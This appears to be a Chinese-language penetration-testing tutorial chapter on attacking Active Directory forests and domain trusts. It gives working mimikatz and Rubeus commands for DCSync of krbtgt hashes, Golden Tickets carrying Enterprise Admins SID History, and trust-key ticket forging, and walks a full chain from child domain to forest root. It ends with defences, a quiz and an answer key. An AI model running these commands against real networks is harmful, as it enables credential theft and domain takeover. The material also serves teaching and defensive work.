# Active Directory 森林与信任攻击

## 写在前面

大型组织通常使用多域 Active Directory 架构。理解域信任关系对于跨域攻击至关重要。本章详细讲解森林、信任和跨域攻击技术。

---

## 一、Active Directory 森林基础

### 1.1 基本概念

```
AD 层次结构:
┌─────────────────────────────────────────────────────────────┐
│  森林 (Forest)                                              │
│  └─ 域树 (Domain Tree)                                      │
│     └─ 根域 (Root Domain): corp1.com                        │
│        └─ 子域 (Child Domain): prod.corp1.com               │
│           └─ 孙域: factory.prod.corp1.com                   │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 信任类型

| 信任类型 | 方向 | 传递性 | 说明 |
|----------|------|--------|------|
| 父子信任 | 双向 | 是 | 自动创建 |
| 树根信任 | 双向 | 是 | 森林内不同树之间 |
| 快捷信任 | 双向 | 是 | 优化认证路径 |
| 外部信任 | 单向/双向 | 否 | 不同森林之间 |
| 森林信任 | 单向/双向 | 是 | 森林级别信任 |

### 1.3 重要组

```
特权组:
├── Domain Admins
│   └── 控制单个域
├── Enterprise Admins
│   └── 控制整个森林 (只存在于根域)
└── Schema Admins
    └── 修改 AD 架构
```

## 二、枚举域信任

### 2.1 使用 nltest

```cmd
# 枚举信任的域
nltest /trusted_domains

# 输出示例:
# 0: CORP1 corp1.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound)
# 1: PROD prod.corp1.com (NT 5) (Forest: 0) (Primary Domain) (Native)
```

### 2.2 使用 .NET

```powershell
# 获取当前域的所有信任关系
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# 输出:
# SourceName     TargetName   TrustType    TrustDirection
# prod.corp1.com corp1.com    ParentChild  Bidirectional
```

### 2.3 使用 PowerView

```powershell
# 使用 Win32 API
Get-DomainTrust -API

# 使用 LDAP
Get-DomainTrust

# 枚举特定域的信任
Get-DomainTrust -Domain corp1.com
```

### 2.4 枚举其他域的用户

```powershell
# 枚举信任域中的用户
Get-DomainUser -Domain corp1.com

# 枚举信任域中的组
Get-DomainGroup -Domain corp1.com

# 查找 Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain corp1.com
```

## 三、跨域攻击 - SID History

### 3.1 SID History 原理

```
SID History:
├── 用于域迁移时保留旧权限
├── 存储在用户对象的 sidHistory 属性
├── 认证时会包含在 PAC 中
└── 可以被滥用来提升权限
```

### 3.2 Golden Ticket 跨域攻击

```
攻击前提:
├── 已获得子域的 krbtgt 哈希
├── 知道父域的 SID
└── 可以伪造包含 Enterprise Admins SID 的票据
```

```cmd
# 1. 获取子域 krbtgt 哈希
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:krbtgt

# 2. 获取父域 SID
Get-DomainSID -Domain corp1.com
# 输出: S-1-5-21-1095350385-1831131555-2412080359

# 3. 构造 Enterprise Admins SID
# Enterprise Admins RID = 519
# SID = S-1-5-21-1095350385-1831131555-2412080359-519

# 4. 创建带有 SID History 的 Golden Ticket
mimikatz # kerberos::golden /user:fakeuser /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:HASH /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
```

### 3.3 使用 Rubeus

```cmd
# 创建跨域 Golden Ticket
Rubeus.exe golden /user:fakeuser /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /rc4:KRBTGT_HASH /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
```

## 四、跨域攻击 - Trust Key

### 4.1 Trust Key 原理

```
Trust Key:
├── 域之间建立信任时创建的共享密钥
├── 存储在 TDO (Trusted Domain Object) 中
├── 用于跨域 TGT 验证
└── 可以用来伪造跨域 TGT
```

### 4.2 获取 Trust Key

```cmd
# 使用 Mimikatz 获取 Trust Key
mimikatz # lsadump::trust /patch

# 或使用 DCSync
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:corp1$
```

### 4.3 使用 Trust Key 攻击

```cmd
# 创建 Inter-Realm TGT
mimikatz # kerberos::golden /user:administrator /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /rc4:TRUST_KEY /service:krbtgt /target:corp1.com /ticket:trust.kirbi

# 使用票据请求父域服务
Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/rdc01.corp1.com /dc:rdc01.corp1.com /ptt
```

## 五、完整攻击流程

### 5.1 从子域到森林根域

```
步骤 1: 枚举信任关系
┌─────────────────────────────────────────────────────────────┐
│  Get-DomainTrust                                            │
│  发现: prod.corp1.com → corp1.com (父子信任)                 │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 2: 获取子域 krbtgt 哈希
┌─────────────────────────────────────────────────────────────┐
│  mimikatz # lsadump::dcsync /user:krbtgt                    │
│  获得: 4b6af2bf64714682eeef64f516a08949                      │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 3: 获取父域 SID
┌─────────────────────────────────────────────────────────────┐
│  Get-DomainSID -Domain corp1.com                            │
│  获得: S-1-5-21-1095350385-1831131555-2412080359            │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 4: 创建 Golden Ticket
┌─────────────────────────────────────────────────────────────┐
│  kerberos::golden /user:admin /domain:prod.corp1.com        │
│      /sid:CHILD_SID /krbtgt:HASH                            │
│      /sids:PARENT_SID-519 /ptt                              │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 5: 访问父域资源
┌─────────────────────────────────────────────────────────────┐
│  dir \\rdc01.corp1.com\c$                                   │
│  以 Enterprise Admin 身份访问森林根域控制器                  │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 C# 实现枚举

```csharp
using System;
using System.DirectoryServices.ActiveDirectory;

class TrustEnum
{
    static void Main()
    {
        // 获取当前域
        Domain currentDomain = Domain.GetCurrentDomain();
        Console.WriteLine("当前域: " + currentDomain.Name);

        // 枚举信任关系
        TrustRelationshipInformationCollection trusts =
            currentDomain.GetAllTrustRelationships();

        foreach (TrustRelationshipInformation trust in trusts)
        {
            Console.WriteLine("\n信任关系:");
            Console.WriteLine("  源域: " + trust.SourceName);
            Console.WriteLine("  目标域: " + trust.TargetName);
            Console.WriteLine("  信任类型: " + trust.TrustType);
            Console.WriteLine("  信任方向: " + trust.TrustDirection);
        }
    }
}
```

## 六、SID 过滤绕过

### 6.1 SID 过滤

```
SID 过滤:
├── 防止跨森林的 SID History 攻击
├── 过滤掉来自外部森林的特权 SID
├── 默认在森林信任中启用
└── 在域内信任中不启用
```

### 6.2 绕过方法

```
绕过条件:
├── 森林内的父子信任不启用 SID 过滤
├── 可以利用 SID History 攻击
└── 外部信任需要其他方法
```

## 七、防御措施

### 7.1 保护 krbtgt 账户

```powershell
# 定期轮换 krbtgt 密码
# 使用 Microsoft 提供的脚本
# https://github.com/microsoft/New-KrbtgtKeys.ps1

# 监控 krbtgt 账户的 DCSync 请求
```

### 7.2 启用 SID 过滤

```powershell
# 检查 SID 过滤状态
netdom trust CHILD.DOMAIN /domain:PARENT.DOMAIN /quarantine

# 启用 SID 过滤 (外部信任)
netdom trust CHILD.DOMAIN /domain:PARENT.DOMAIN /quarantine:yes
```

### 7.3 监控

```
监控点:
├── 跨域 TGT 请求
├── 包含 SID History 的票据
├── Enterprise Admins 组变更
├── Trust Key 访问
└── DCSync 活动
```

## 八、练习题

### 选择题

1. Enterprise Admins 组存在于哪里？
   - A) 每个域
   - B) 只有根域
   - C) 只有子域
   - D) 不存在

2. 父子信任的默认方向是？
   - A) 单向
   - B) 双向
   - C) 无信任
   - D) 取决于配置

3. SID History 攻击需要什么？
   - A) 父域的 krbtgt 哈希
   - B) 子域的 krbtgt 哈希
   - C) 两个域的 krbtgt 哈希
   - D) 不需要哈希

4. Trust Key 存储在哪里？
   - A) krbtgt 账户
   - B) TDO 对象
   - C) 用户账户
   - D) 计算机账户

5. SID 过滤在哪种信任中默认启用？
   - A) 父子信任
   - B) 森林信任
   - C) 快捷信任
   - D) 所有信任

### 答案

1-B, 2-B, 3-B, 4-B, 5-B

## 九、总结

### 关键要点

✅ 森林是 AD 的最高级别容器
✅ 父子信任是双向传递的
✅ Enterprise Admins 只存在于根域
✅ SID History 可以用于跨域提权
✅ Trust Key 可以伪造跨域票据

### 攻击链

```
攻陷子域
    ↓
获取 krbtgt 哈希
    ↓
获取父域 SID
    ↓
创建带 SID History 的 Golden Ticket
    ↓
访问森林根域
    ↓
控制整个森林
```
